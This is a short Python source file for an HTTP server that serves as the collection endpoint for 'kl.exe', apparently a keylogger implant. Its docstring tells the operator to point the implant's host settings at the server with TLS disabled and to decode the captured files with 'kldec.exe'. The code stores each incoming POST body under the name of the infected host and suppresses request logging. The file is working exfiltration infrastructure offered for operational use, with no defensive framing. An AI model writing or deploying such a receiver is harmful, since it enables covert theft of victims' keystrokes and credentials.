"""Minimal ingest endpoint for kl.exe. Writes each POST body to inbox/.

Run: python server.py
Point CFG_HOST at this machine's IP, CFG_PORT 8080, CFG_PATH "/", CFG_TLS FALSE.
Decode with: kldec.exe inbox\\<file>.bin > plain.txt
"""

import os
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "inbox")
os.makedirs(OUT, exist_ok=True)


class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n)
        host = (self.headers.get("X-Implant-Host") or "unknown").replace("/", "_")
        name = f"{int(time.time() * 1000)}_{host}.bin"
        with open(os.path.join(OUT, name), "wb") as fh:
            fh.write(body)
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.end_headers()
        print(f"{name}  {len(body)} bytes")

    def log_message(self, *args):
        pass


if __name__ == "__main__":
    print(f"listening 0.0.0.0:8080 -> {OUT}")
    ThreadingHTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
